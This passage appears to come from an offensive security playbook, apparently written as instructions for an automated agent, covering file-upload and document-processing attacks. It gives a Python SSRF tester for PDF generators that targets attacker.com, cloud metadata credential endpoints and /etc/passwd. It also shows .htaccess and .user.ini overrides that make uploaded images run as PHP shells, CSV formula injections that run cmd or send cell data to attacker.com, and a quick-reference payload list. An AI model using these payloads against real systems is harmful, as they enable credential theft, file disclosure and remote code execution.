â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 PDF Generation Attack Script
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/usr/bin/env python3
# pdf_ssrf_test.py

"""
Test SSRF in PDF generation functionality
"""

import requests

class PDFSSRFTester:
    def __init__(self, pdf_url, input_param='html', oob_server=None, auth_cookies=None):
        self.pdf_url = pdf_url
        self.input_param = input_param
        self.oob_server = oob_server
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(auth_cookies or {})
        self.results = []
    
    def get_ssrf_payloads(self):
        """Generate SSRF payloads for PDF"""
        
        oob = self.oob_server or 'attacker.com'
        
        payloads = [
            # Basic SSRF
            f'<img src="http://{oob}/ssrf/img">',
            f'<link rel="stylesheet" href="http://{oob}/ssrf/link">',
            f'<iframe src="http://{oob}/ssrf/iframe">',
            f'<script src="http://{oob}/ssrf/script"></script>',
            
            # Cloud metadata
            '<img src="http://169.254.169.254/latest/meta-data/">',
            '<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
            
            # Internal services
            '<img src="http://localhost/">',
            '<img src="http://127.0.0.1:8080/">',
            '<iframe src="http://localhost:3000/admin">',
            
            # File read
            '<iframe src="file:///etc/passwd" width="500" height="500">',
            '<iframe src="file:///c:/windows/win.ini">',
            '<embed src="file:///etc/passwd">',
            '<object data="file:///etc/passwd">',
            
            # JavaScript SSRF
            f'''<script>
            var x = new XMLHttpRequest();
            x.open('GET','http://{oob}/ssrf/xhr',false);
            x.send();
            document.write(x.responseText);
            </script>''',
        ]
        
        return payloads
    
    def test_payload(self, payload):
        """Test single payload"""
        
        data = {self.input_param: payload}
        
        try:
            resp = self.session.post(self.pdf_url, data=data, timeout=60)
            
            # Check if PDF was generated
            content_type = resp.headers.get('Content-Type', '')
            
            if 'pdf' in content_type.lower() or resp.content[:4] == b'%PDF':
                return True, resp.content
        except:
            pass
        
        return False, None
    
    def run_tests(self):
        """Test all SSRF payloads"""
        
        payloads = self.get_ssrf_payloads()
        
        for payload in payloads:
            print(f"[*] Testing payload: {payload[:50]}...")
            success, pdf_content = self.test_payload(payload)
            
            if success:
                print(f"[+] PDF generated")
                self.results.append({
                    'payload': payload,
                    'generated': True
                })
        
        return self.results

================================================================================
PHASE 5: .HTACCESS UPLOAD
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 .htaccess Override Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# htaccess_upload.sh

# If you can upload .htaccess to a directory, you can:
# 1. Make any file executable as PHP
# 2. Override security settings
# 3. Enable server-side includes

mkdir -p temp/agent1/upload/htaccess

# Make .jpg files execute as PHP
cat > temp/agent1/upload/htaccess/.htaccess_jpg << 'EOF'
AddType application/x-httpd-php .jpg
EOF

# Make all files PHP
cat > temp/agent1/upload/htaccess/.htaccess_all << 'EOF'
AddHandler php-script .txt .jpg .png .gif
EOF

# Enable server-side includes
cat > temp/agent1/upload/htaccess/.htaccess_ssi << 'EOF'
Options +Includes
AddType text/html .shtml
AddHandler server-parsed .shtml
EOF

# Override settings
cat > temp/agent1/upload/htaccess/.htaccess_override << 'EOF'
php_value auto_prepend_file /etc/passwd
php_value auto_append_file shell.php
EOF

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 .user.ini Upload (PHP-FPM)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# For PHP-FPM, use .user.ini instead

cat > temp/agent1/upload/htaccess/.user.ini << 'EOF'
auto_prepend_file=shell.jpg
EOF

# With this, every PHP file in the directory will include shell.jpg first!

================================================================================
PHASE 6: CSV FORMULA INJECTION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 CSV Injection Payloads
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# When uploading CSV that will be opened in Excel/Google Sheets

# Basic formula execution
=cmd|'/C calc'!A0

# DDE exploit (older Excel)
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!''

# Google Sheets SSRF
=IMPORTXML("http://attacker.com/ssrf","//a")
=IMPORTDATA("http://attacker.com/ssrf")
=IMPORTFEED("http://attacker.com/ssrf")

# Hyperlink data exfil
=HYPERLINK("http://attacker.com/exfil?data="&A1,"Click")

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 CSV Payload Generator
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/usr/bin/env python3
# csv_injection.py

"""
Generate CSV files with formula injection payloads
"""

def generate_malicious_csv(attacker_server):
    """Generate CSV with various injection payloads"""
    
    payloads = [
        # Command execution
        ('cmd_calc', '=cmd|"/C calc"!A0'),
        ('dde', '=MSEXCEL|"\\..\\..\\Windows\\System32\\cmd.exe /c calc"!""'),
        
        # Data exfiltration
        ('hyperlink', f'=HYPERLINK("http://{attacker_server}/steal?data="&A1,"Click here")'),
        
        # Google Sheets SSRF
        ('importxml', f'=IMPORTXML("http://{attacker_server}/ssrf","//a")'),
        ('importdata', f'=IMPORTDATA("http://{attacker_server}/ssrf")'),
        
        # Bypass attempts
        ('bypass_space', ' =cmd|"/C calc"!A0'),
        ('bypass_tab', '\t=cmd|"/C calc"!A0'),
        ('bypass_at', '@SUM(1+1)*cmd|"/C calc"!A0'),
        ('bypass_plus', '+cmd|"/C calc"!A0'),
        ('bypass_minus', '-cmd|"/C calc"!A0'),
    ]
    
    results = []
    
    for name, payload in payloads:
        csv_content = f'''Name,Email,Comment
John,john@test.com,{payload}
Jane,jane@test.com,Normal comment'''
        
        filename = f'injection_{name}.csv'
        results.append((filename, csv_content))
    
    return results

================================================================================
SUMMARY & CHECKLIST
================================================================================

Before completing this task, verify:

â–¡ SVG XSS tested - check if served as image/svg+xml
â–¡ XXE-DOCX/XLSX tested - use OOB for blind detection
â–¡ ImageTragick tested - check OOB server for callbacks
â–¡ PDF SSRF tested - try cloud metadata endpoints
â–¡ .htaccess upload attempted (Apache only)
â–¡ CSV injection payloads prepared
â–¡ All results documented

================================================================================
ğŸ“š QUICK REFERENCE
================================================================================

SVG XSS:
  <svg onload="alert(1)">
  <script>alert(1)</script> inside SVG

XXE-DOCX:
  Put XXE in [Content_Types].xml or word/document.xml

ImageTragick:
  fill 'url(https://x.com"|id")'
  Affects: convert, identify, display

PDF SSRF:
  <img src="http://169.254.169.254/">
  <iframe src="file:///etc/passwd">

.htaccess:
  AddType application/x-httpd-php .jpg

CSV Injection:
  =cmd|'/C calc'!A0
